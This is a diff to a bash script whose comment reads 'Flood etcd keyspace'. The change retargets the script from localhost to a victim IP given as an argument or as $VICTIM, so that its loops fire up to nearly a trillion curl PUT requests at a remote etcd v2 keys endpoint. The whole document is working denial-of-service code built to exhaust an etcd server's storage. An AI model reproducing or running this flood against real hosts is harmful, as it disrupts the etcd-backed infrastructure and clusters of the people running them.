@@ -8,6 +8,12 @@ if [[ -z "$ARG" && -z "$VICTIM" ]] ; then
 	exit 0
 fi
 
+if [[ -z "$1" ]] ; then
+	IP=$VICTIM
+else
+	IP=$1
+fi
+
 # Flood etcd keyspace
 
 # Determine if md5 or md5sum
@@ -30,7 +36,7 @@ if [[ -z "$COUNT" ]] ; then
 	while [[ $COUNT -lt 999999999999 ]] ; do
 
 		VAL=`echo $COUNT | $MD5`
-		curl -L -X PUT http://127.0.0.1:2379/v2/keys/$VAL -d value="$COUNT"
+		curl -L -X PUT http://$IP:2379/v2/keys/$VAL -d value="$COUNT"
 		COUNT=$[COUNT+1]
 	done
 	exit 0
@@ -40,7 +46,7 @@ else
 	while [[ $COUNT -le $INC ]] ; do
 
     VAL=`echo $COUNT | $MD5`
-    curl -L -X PUT http://127.0.0.1:2379/v2/keys/$VAL -d value="$COUNT"
+    curl -L -X PUT http://$IP:2379/v2/keys/$VAL -d value="$COUNT"
     COUNT=$[COUNT+1]
   done
   exit 0
